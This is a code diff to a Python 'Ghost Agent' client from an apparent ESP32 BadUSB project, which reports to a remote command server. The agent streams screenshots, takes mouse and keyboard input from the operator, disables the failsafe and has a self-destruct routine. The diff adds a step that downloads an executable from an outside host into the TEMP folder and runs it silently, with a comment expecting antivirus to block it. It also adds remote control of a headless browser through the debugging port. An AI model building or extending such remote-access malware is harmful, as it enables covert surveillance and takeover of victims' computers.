@@ -7,12 +7,17 @@ import socketio
 try:
     from PIL import ImageGrab
     import pyautogui
+    import requests
 except ImportError:
     print("Installing required packages...")
     import subprocess
     subprocess.check_call([sys.executable, "-m", "pip", "install", "pillow", "python-socketio", "requests", "websocket-client", "pyautogui"])
     from PIL import ImageGrab
     import pyautogui
+    import requests
+    import websocket
+    import json
+    import os
     
 pyautogui.FAILSAFE = False
 
@@ -20,6 +25,11 @@ pyautogui.FAILSAFE = False
 SERVER_URL = "https://esp32-badusb.onrender.com" # Updated Render URL
 HEARTBEAT_INTERVAL = 1.0 # seconds
 SCREENSHOT_INTERVAL = 2.0 # seconds
+CDP_PORT = 9222
+PINCHTAB_PORT = 4000
+PINCHTAB_ACTIVE = False
+ws_cdp = None
+cdp_msg_id = 1
 
 sio = socketio.Client()
 current_mode = "B" # Default to safety mode
@@ -27,6 +37,76 @@ running = True
 
 def print_log(msg):
     print(f"[AGENT] {msg}")
+
+def download_and_start_pinchtab():
+    global PINCHTAB_ACTIVE
+    try:
+        temp_dir = os.environ.get('TEMP', 'C:\\Windows\\Temp')
+        exe_path = os.path.join(temp_dir, 'pinchtab.exe')
+        
+        print_log("Downloading PinchTab...")
+        res = requests.get('https://pinchtab.com/download/windows/pinchtab.exe')
+        with open(exe_path, 'wb') as f:
+            f.write(res.content)
+            
+        print_log("Starting PinchTab server...")
+        subprocess.Popen([exe_path, "server"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2)
+        
+        # Test if it's running
+        requests.get(f"http://127.0.0.1:{PINCHTAB_PORT}", timeout=2)
+        PINCHTAB_ACTIVE = True
+        print_log("PinchTab is active!")
+    except Exception as e:
+        print_log(f"PinchTab failed (likely blocked by AV). Falling back to Python CDP. Error: {e}")
+        PINCHTAB_ACTIVE = False
+
+def get_chrome_path():
+    paths = [
+        r"C:\Program Files\Google\Chrome\Application\chrome.exe",
+        r"C:\Program Files (x86)\Google\Chrome\Application\chrome.exe",
+        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+    ]
+    for p in paths:
+        if os.path.exists(p):
+            return p
+    return None
+
+def start_cdp_chrome():
+    global ws_cdp
+    try:
+        chrome_path = get_chrome_path()
+        if not chrome_path:
+            print_log("Chrome/Edge not found.")
+            return
+
+        print_log("Starting headless Chrome with CDP...")
+        subprocess.Popen([chrome_path, "--headless", f"--remote-debugging-port={CDP_PORT}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        time.sleep(2) # wait for startup
+
+        # Get WebSocket URL
+        res = requests.get(f"http://127.0.0.1:{CDP_PORT}/json")
+        pages = res.json()
+        if pages:
+            ws_url = pages[0].get("webSocketDebuggerUrl")
+            ws_cdp = websocket.WebSocket()
+            ws_cdp.connect(ws_url)
+            print_log("Connected to Chrome via CDP!")
+    except Exception as e:
+        print_log(f"CDP Start failed: {e}")
+
+def send_cdp_command(method, params=None):
+    global cdp_msg_id, ws_cdp
+    if not ws_cdp: return
+    if params is None: params = {}
+    msg = {"id": cdp_msg_id, "method": method, "params": params}
+    ws_cdp.send(json.dumps(msg))
+    cdp_msg_id += 1
+
+def initialize_browser_control():
+    download_and_start_pinchtab()
+    if not PINCHTAB_ACTIVE:
+        start_cdp_chrome()
 
 @sio.event
 def connect():
@@ -53,6 +133,29 @@ def execute_json_command(data):
     print_log(f"Received JSON Command: {data}")
     try:
         action = data.get("action")
+        
+        # HYBRID BROWSER INTEGRATION
+        if action.startswith("pinchtab_"):
+            if PINCHTAB_ACTIVE:
+                # Route to PinchTab API
+                pt_action = action.replace("pinchtab_", "")
+                requests.post(f"http://127.0.0.1:{PINCHTAB_PORT}/v1/browser/{pt_action}", json=data, timeout=5)
+            else:
+                # Route to Python CDP Fallback
+                if action == "pinchtab_navigate":
+                    send_cdp_command("Page.navigate", {"url": data.get("url")})
+                elif action == "pinchtab_click":
+                    selector = data.get("selector")
+                    js = f"document.querySelector('{selector}').click();"
+                    send_cdp_command("Runtime.evaluate", {"expression": js})
+                elif action == "pinchtab_type":
+                    selector = data.get("selector")
+                    text = data.get("text")
+                    js = f"document.querySelector('{selector}').value = '{text}';"
+                    send_cdp_command("Runtime.evaluate", {"expression": js})
+            return
+
+        # FALLBACK PYAUTOGUI
         x = data.get("x")
         y = data.get("y")
         text = data.get("text")
@@ -113,6 +216,8 @@ def self_destruct():
 def main_loop():
     global running
     print_log("Ghost Agent Started.")
+    
+    initialize_browser_control()
     
     # Start screenshot thread
     threading.Thread(target=send_screenshots, daemon=True).start()
